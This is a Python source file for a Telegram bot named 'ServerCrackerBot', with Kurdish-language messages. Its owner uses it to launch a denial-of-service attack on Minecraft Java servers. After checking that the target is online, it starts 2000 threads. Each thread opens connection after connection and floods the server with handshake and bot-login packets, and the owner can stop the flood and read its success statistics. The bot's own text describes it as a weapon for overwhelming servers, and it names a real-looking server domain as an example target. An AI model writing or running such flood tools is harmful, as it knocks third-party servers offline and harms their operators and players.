import os
import socket
import threading
import sys
import time
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))

user_states = {}
attack_active = False
attack_stats = {"success": 0, "failed": 0}

def get_minecraft_server_status(host, port=25565):
    try:
        ip = socket.gethostbyname(host)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect((ip, int(port)))

        host_bytes = host.encode('utf-8')
        port_bytes = int(port).to_bytes(2, 'big')
        
        handshake = b'\x00' + b'\x2f' + chr(len(host_bytes)).encode('utf-8') + host_bytes + port_bytes + b'\x01'
        packet_handshake = len(handshake).to_bytes(1, 'big') + handshake
        packet_status = b'\x01\x00'

        s.sendall(packet_handshake + packet_status)

        data_len = 0
        shift = 0
        while True:
            b = s.recv(1)
            if not b:
                break
            val = b[0]
            data_len |= (val & 0x7F) << shift
            if not (val & 0x80):
                break
            shift += 7

        response_data = b""
        while len(response_data) < data_len:
            packet = s.recv(data_len - len(response_data))
            if not packet:
                break
            response_data += packet

        s.close()

        if response_data:
            json_str = response_data[1:].decode('utf-8', errors='ignore')
            json_start = json_str.find('{')
            if json_start != -1:
                server_info = json.loads(json_str[json_start:])
                return True, server_info
        return False, "وەڵامێکی نەگونجاو لە سێرڤەرەوە وەرگیرا."
    except Exception as e:
        return False, str(e)

def create_heavy_bot_packet(host, port):
    """دروستکردنی پاکێتی قورس و بەهێز بۆ پڕکردنی سێرڤەر بە بۆت"""
    host_bytes = host.encode('utf-8')
    port_bytes = int(port).to_bytes(2, 'big')
    # Handshake بۆ بەستنی سۆکێت وەک بۆت
    handshake_data = b'\x00' + b'\x2f' + chr(len(host_bytes)).encode('utf-8') + host_bytes + port_bytes + b'\x02'
    packet_length = len(handshake_data).to_bytes(1, 'big')
    
    # Login Start Packet (فەرمانی چوونەژوورەوەی بۆت بە ناوی هەڕەمەکی)
    bot_name = f"Bot_{int(time.time()*1000) % 100000}".encode('utf-8')
    login_data = b'\x00' + chr(len(bot_name)).encode('utf-8') + bot_name
    login_length = len(login_data).to_bytes(1, 'big')
    
    return packet_length + handshake_data + login_length + login_data

def flood_worker(host, port):
    global attack_active, attack_stats
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = host

    heavy_payload = create_heavy_bot_packet(host, port)

    while attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip, int(port)))
            
            # ناردنی زنجیرەیەک پاکێتی قورس بۆ هەر سۆکێتێک بە خێراییەکی بێوێنە
            for _ in range(50):
                if not attack_active:
                    break
                s.send(heavy_payload)
            
            attack_stats["success"] += 1
        except Exception:
            attack_stats["failed"] += 1
        finally:
            try:
                s.close()
            except:
                pass

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💀 دەربارەی بۆت", callback_data="about_bot")],
        [InlineKeyboardButton("🔥 هێرش بۆ سێرڤەری Minecraft Java", callback_data="start_attack_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "💀 **بەخێربێیت بۆ مەکینەی وێرانکەری ServerCrackerBot!**\n\nفەرموو یەکێک لە بژاردەکانی خوارەوە هەڵبژێرە:",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "about_bot":
        about_text = (
            "💀 **دەربارەی ServerCrackerBot:**\n\n"
            "ئەم بۆتە چەکێکی پێشکەوتووی بێبەزەییە بۆ داگیرکردنی سێرڤەرەکان بە ملیۆنەها بۆت و پاکێتی کوشندە (Java Edition).\n\n"
            "⚡️ **تەنها بۆ `@ALONE427` کار دەکات!**"
        )
        await query.message.reply_text(about_text)

    elif query.data == "start_attack_menu":
        if user_id != OWNER_ID:
            await query.message.reply_text("💀 تۆ ڕێگەپێدراو نییت!")
            return
        user_states[user_id] = "waiting_ip"
        await query.message.reply_text(
            "🎯 **ئامادەکاری بۆ هێرشی فراوان:**\n\n"
            "تکایە ناوی دۆمەین یان ئایپی سێرڤەرەکە بنووسە:\n"
            "نموونە: `abysssmp.playwithbao.com`"
        )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active, attack_stats
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        return

    if user_states.get(user_id) == "waiting_ip":
        host = update.message.text.strip().replace("@", "")
        if not host:
            await update.message.reply_text("🔥 هەڵە! تکایە ناوی دۆمەین یان ئایپی دروست بنووسە.")
            return

        port = 25565
        user_states[user_id] = None

        loading_msg = await update.message.reply_text(f"🔍 **پشکنینی پێشوەختەی سێرڤەر (`{host}`)...**")

        is_online, info = get_minecraft_server_status(host, port)

        if not is_online:
            await loading_msg.edit_text(f"❌ **سێرڤەرەکە بەردەست نییە یان دۆزراوەتەوە!**\nهۆکار: `{info}`")
            return

        version = info.get("version", {}).get("name", "نەزانراو")
        max_players = info.get("players", {}).get("max", 0)
        online_players = info.get("players", {}).get("online", 0)
        
        motd_raw = info.get("description", "")
        if isinstance(motd_raw, dict):
            motd = motd_raw.get("text", "")
        else:
            motd = str(motd_raw)

        await loading_msg.edit_text(
            f"✅ **پشکنین سەرکەوتوو بوو! سێرڤەر ئۆنلاینە:**\n\n"
            f"🎯 **ئامانج:** `{host}:{port}`\n"
            f"📦 **وەشان:** `{version}`\n"
            f"👥 **یاریزانان:** `{online_players} / {max_players}`\n"
            f"💬 **پەیام:** `{motd}`\n\n"
            f"🔥 **هێرشی پڕکردنی بۆتەکان دەستی پێکرد!**"
        )

        attack_active = True
        attack_stats = {"success": 0, "failed": 0}

        # بەرزکردنەوەی ژمارەی تریدەکان بۆ ئاستێکی زۆر بەرزتر بۆ لشاوکردنی سێرڤەرەکە
        threads_count = 2000
        for _ in range(threads_count):
            t = threading.Thread(target=flood_worker, args=(host, port))
            t.daemon = True
            t.start()

        await update.message.reply_text(
            f"🚀 **مەکینەکە بە توانای 2000 تریدی هاوکات کار دەکات!**\n"
            f"⏹ بۆ وەستاندنی هێرشەکە، فەرمانی `/stop` بنووسە.\n"
            f"📊 بۆ پشکنینی ڕەوشی هێرش، فەرمانی `/status` بنووسە."
        )

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active
    if update.effective_user.id != OWNER_ID:
        return
    
    attack_active = False
    await update.message.reply_text("⏹ **هێرشەکە ڕاگیرا.**")

async def attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    
    success = attack_stats["success"]
    failed = attack_stats["failed"]
    total = success + failed
    success_rate = (success / total * 100) if total > 0 else 0
    
    status_text = (
        "📊 **پشکنینی ڕەوشی هێرش (Server Status):**\n\n"
        f"✅ هێرش و پەیوەندییە سەرکەوتووەکان: `{success}`\n"
        f"❌ هێرشە سەرنەکەوتووەکان (پچڕاو/ڕەتکراوە): `{failed}`\n"
        f"📈 ڕێژەی سەرکەوتنی هێرشەکە: `{success_rate:.2f}%`\n"
        f"⚡️ دۆخی هێرش: {'🔴 لە کاردایە (Active)' if attack_active else '⚪️ وەستاوە'}"
    )
    await update.message.reply_text(status_text)

def main():
    if not TOKEN or not OWNER_ID:
        print("❌ هەڵە: توکن یان ئایدی خاوەن نەدۆزراوەتەوە لە Secrets!")
        sys.exit(1)
        
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stop", stop_attack))
    app.add_handler(CommandHandler("status", attack_status))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    print("💀 بۆتی ServerCrackerBot بە سەرکەوتوویی کەوتە کار...")
    app.run_polling()

if __name__ == "__main__":
    main()
